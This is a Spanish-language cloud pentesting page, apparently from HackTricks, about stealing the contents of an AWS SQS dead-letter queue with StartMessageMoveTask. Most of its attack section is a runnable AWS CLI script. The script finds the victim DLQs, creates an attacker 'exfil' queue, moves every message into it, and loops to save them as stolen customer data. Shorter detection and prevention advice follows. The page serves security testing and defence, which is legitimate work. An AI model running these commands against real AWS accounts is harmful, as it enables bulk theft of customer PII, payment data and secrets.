# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Descripción

Abusar de las tareas de movimiento de mensajes de SQS para robar todos los mensajes acumulados en el Dead-Letter Queue (DLQ) de una víctima redirigiéndolos a una queue controlada por el atacante usando `sqs:StartMessageMoveTask`. Esta técnica explota la funcionalidad legítima de recuperación de mensajes de AWS para exfiltrar datos sensibles que se han acumulado en los DLQ a lo largo del tiempo.

## ¿Qué es un Dead-Letter Queue (DLQ)?

Un Dead-Letter Queue es una queue especial de SQS donde los mensajes se envían automáticamente cuando fallan al ser procesados correctamente por la aplicación principal. Estos mensajes fallidos a menudo contienen:
- Datos sensibles de la aplicación que no pudieron procesarse
- Detalles de errores e información para depuración
- Información de identificación personal (PII)
- Tokens de API, credenciales u otros secretos
- Datos de transacciones críticos para el negocio

Los DLQ actúan como un "cementerio" para mensajes fallidos, lo que los convierte en objetivos valiosos ya que acumulan datos sensibles con el tiempo que las aplicaciones no pudieron manejar correctamente.

## Escenario de ataque

**Ejemplo del mundo real:**
1. **Una aplicación de e-commerce** procesa pedidos de clientes a través de SQS
2. **Algunos pedidos fallan** (problemas de pago, inventario, etc.) y se mueven a un DLQ
3. **El DLQ acumula** semanas/meses de pedidos fallidos que contienen datos de clientes: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **El atacante obtiene acceso** a credenciales de AWS con permisos de SQS
5. **El atacante descubre** que el DLQ contiene miles de pedidos fallidos con datos sensibles
6. **En lugar de intentar acceder a mensajes individuales** (lento y obvio), el atacante usa `StartMessageMoveTask` para transferir a granel TODOS los mensajes a su propia queue
7. **El atacante extrae** todos los datos históricos sensibles en una sola operación

## Requisitos
- La queue de origen debe estar configurada como DLQ (referenciada por al menos una RedrivePolicy de alguna queue).
- Permisos IAM (ejecutados como el principal víctima comprometido):
  - En la DLQ (origen): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
  - En la queue de destino: permiso para entregar mensajes (por ejemplo, política de queue que permita `sqs:SendMessage` desde el principal víctima). Para destinos en la misma cuenta, esto suele estar permitido por defecto.
- Si SSE-KMS está habilitado: en la CMK de origen `kms:Decrypt`, y en la CMK de destino `kms:GenerateDataKey`, `kms:Encrypt`.

## Impacto
Exfiltrar cargas útiles sensibles acumuladas en DLQs (eventos fallidos, PII, tokens, payloads de aplicación) a alta velocidad usando las APIs nativas de SQS. Funciona cross-account si la política de la queue de destino permite `SendMessage` desde el principal víctima.

## Cómo abusar

- Identifique el ARN del DLQ de la víctima y asegúrese de que realmente esté referenciado como DLQ por alguna queue (cualquier queue sirve).
- Cree o elija una queue controlada por el atacante y obtenga su ARN.
- Inicie una tarea de movimiento de mensajes desde el DLQ de la víctima hacia su queue de destino.
- Monitoree el progreso o cancele si es necesario.

### Ejemplo CLI: Exfiltración de datos de clientes desde DLQ de e-commerce

**Escenario**: Un atacante ha comprometido credenciales de AWS y descubrió que una aplicación de e-commerce usa SQS con un DLQ que contiene intentos fallidos de procesamiento de pedidos de clientes.

1) **Descubrir y examinar el DLQ de la víctima**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Crear cola de destino controlada por attacker**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Ejecutar el robo masivo de mensajes**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Recopilar los datos sensibles robados**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Notas entre cuentas
- La cola de destino debe tener una política de recursos que permita al principal víctima `sqs:SendMessage` (and, if used, KMS grants/permissions).

## Por qué este ataque es efectivo

1. **Funcionalidad legítima de AWS**: Usa la funcionalidad integrada de AWS, lo que dificulta detectarla como maliciosa
2. **Operación masiva**: Transfiere miles de mensajes rápidamente en lugar de acceder uno por uno lentamente
3. **Datos históricos**: Las DLQs acumulan datos sensibles durante semanas/meses
4. **Fuera del radar**: Muchas organizaciones no monitorizan el acceso a DLQs de cerca
5. **Capaz entre cuentas**: Puede exfiltrar a la propia cuenta de AWS del atacante si los permisos lo permiten

## Detección y prevención

### Detección
Supervisa CloudTrail en busca de llamadas API sospechosas `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Prevención
1. **Principio de mínimo privilegio**: Restringir los permisos `sqs:StartMessageMoveTask` solo a los roles necesarios
2. **Monitorear DLQs**: Configurar alarmas de CloudWatch para actividad inusual en DLQs
3. **Políticas entre cuentas**: Revisar cuidadosamente las políticas de las colas SQS que permiten acceso entre cuentas
4. **Cifrar DLQs**: Usar SSE-KMS con políticas de clave restringidas
5. **Limpieza regular**: No permita que datos sensibles se acumulen en DLQs indefinidamente

{{#include ../../../banners/hacktricks-training.md}}
